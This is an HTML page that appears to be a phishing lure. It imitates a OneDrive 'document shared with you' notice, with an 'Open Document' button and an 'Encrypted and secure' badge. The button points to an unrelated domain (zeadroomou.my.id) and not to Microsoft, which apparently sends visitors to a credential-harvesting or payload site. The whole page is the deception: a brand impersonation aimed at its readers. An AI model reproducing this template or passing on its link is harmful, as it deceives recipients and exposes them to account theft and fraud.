<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Document Review</title>
<script src="https://cdn.tailwindcss.com"></script>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
<script src="https://code.iconify.design/iconify-icon/1.0.7/iconify-icon.min.js"></script>
<style>

</style><!-- aura-ga4-start -->

<body class="bg-white flex flex-col min-h-screen text-slate-900 antialiased selection:bg-blue-100 selection:text-blue-900">

    <!-- Header / Logo -->
    <header class="w-full px-6 lg:px-8 py-6 flex items-center justify-start border-b border-slate-100">
        <div class="text-[#0078D4] font-semibold text-lg tracking-tighter">
            ONEDRIVE
        </div>
    </header>

    <!-- Main Content -->
    <main class="flex-1 flex flex-col items-center justify-center p-6 lg:p-8">
        <div class="max-w-lg w-full flex flex-col items-center text-center space-y-8">

            <!-- Icon -->
            <div class="w-16 h-16 bg-slate-50 border border-slate-100 rounded-2xl flex items-center justify-center text-slate-600 shadow-sm">
                <iconify-icon icon="solar:document-text-linear" width="32" height="32" style="stroke-width: 1.5;"></iconify-icon>
            </div>

            <!-- Message -->
            <div class="space-y-3">
                <h1 class="text-2xl sm:text-3xl font-medium tracking-tight text-slate-900 leading-tight">
                    You have received a new document to review.
                </h1>
                <p class="text-sm text-slate-500">
                    This file has been securely shared with you.
                </p>
            </div>

            <!-- Action Button -->
            <div class="pt-4 w-full sm:w-auto">
                <a href="https://zeadroomou.my.id/XA!0SMC4vJ5R26gMDE777zm/" class="group relative inline-flex w-full sm:w-auto items-center justify-center gap-2 h-11 px-8 text-sm font-medium text-white bg-[#0078D4] rounded-full overflow-hidden transition-all hover:bg-[#006CBE] hover:shadow-md focus:outline-none focus:ring-2 focus:ring-[#0078D4] focus:ring-offset-2">
                    <span>Open Document</span>
                    <iconify-icon icon="solar:arrow-right-linear" width="18" height="18" class="transition-transform group-hover:translate-x-0.5" style="stroke-width: 1.5;"></iconify-icon>
                </a>
            </div>

        </div>
    </main>

    <!-- Footer -->
    <footer class="w-full px-6 py-8 flex items-center justify-center text-center">
        <p class="text-xs text-slate-400 flex items-center gap-1.5">
            <iconify-icon icon="solar:shield-check-linear" width="14" height="14" style="stroke-width: 1.5;"></iconify-icon>
            Encrypted and secure
        </p>
    </footer>

</body>
</html>
